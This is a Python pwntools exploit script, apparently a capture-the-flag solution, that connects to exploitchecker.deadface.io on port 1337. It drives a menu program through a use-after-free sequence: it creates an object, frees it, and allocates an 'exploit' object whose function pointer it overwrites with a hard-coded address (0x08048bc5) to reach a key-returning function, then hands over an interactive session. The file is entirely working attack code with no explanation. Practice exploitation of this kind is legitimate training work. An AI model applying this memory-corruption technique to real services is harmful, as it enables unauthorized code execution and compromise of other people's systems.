from pwn import * 


host = "exploitchecker.deadface.io" 
port = 1337
high_addr = str(0x0804)
low_addr = str(0x8bc5)


conn = remote(host,port)


#target
conn.sendline(b"1")
conn.recv(timeout=0.1)
conn.send(b"aaaaaaaa\n")
conn.recv(0xff)
conn.send(b"123\n")
conn.recv(0xff)
conn.send(b"123\n")
conn.recv(0xff)

#delete target
conn.send(b'2\n')
conn.recv(0xff)

#create exploit
conn.send(b'3\n')
conn.recv(0xff)
conn.send(b'AAAAAAAAA\n')
conn.recv(0xff)
#set fp to return key
conn.send(str.encode(low_addr) + b"\n")
conn.recv(0xff)
conn.send(str.encode(high_addr) + b"\n")
conn.recv(0xff)
#fill with random data
conn.send(b'1\n')
conn.recv(0xff)
conn.send(b'1\n')
conn.recv(0xff)
conn.send(b'2\n')
print(conn.recvline())


conn.interactive()

print(conn.recv(1024))
